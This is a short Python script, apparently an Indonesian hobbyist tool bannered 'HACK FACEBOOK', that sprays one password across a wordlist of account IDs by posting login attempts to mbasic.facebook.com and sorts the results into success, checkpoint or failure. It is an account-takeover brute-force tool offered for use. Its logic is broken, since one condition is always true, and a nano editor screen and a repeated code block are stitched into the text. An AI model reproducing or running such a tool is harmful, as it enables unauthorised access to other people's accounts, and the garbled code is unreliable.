# ReinMbf

     

import requests
import os

h = '\033[92'
m = '\033[91m'
k = '\033[93m'
x = '\033[0m'



def login(id,pw):
      data = {'email':id,'pass':pw}
      r = requests.post('https://mbasic.facebook.com/login',data=data)
      if 'm_ses' in r.url or 'save-device':
            print(f'{id} > {h}llogin gagal{x}')
      elif 'check point' in r.url:
            print(f'{id} > {k}akun checkpoint{x}')
      else:
            print(f'{id} > {m}login gagal{x}')


def lis(filenya,pw):
      f = open(filenya,'r').readlines()
      print(f'berhasil menemukan {len(f)} password')
      print(f'dalam proses membuka password')
      for i in f:
          login(i.strip(),pw)



if __name__=='__main__':
      os.system('clear')
      print(h+'HACK FACEBOOK'.center(40))
      print(m+'by ReinXceed'.center(40))
      f = input('worldlist: ' )
                              [ Read 37 lines ]
^G Get Help    ^O Write Out   ^W Where Is    ^K Cut Text    ^J Justify
^X Exit        ^R Read File   ^\ Replace     ^U Pasteif __name__=='__main__':
      f = input('worldlist: ' )
      pw = input('password: ')

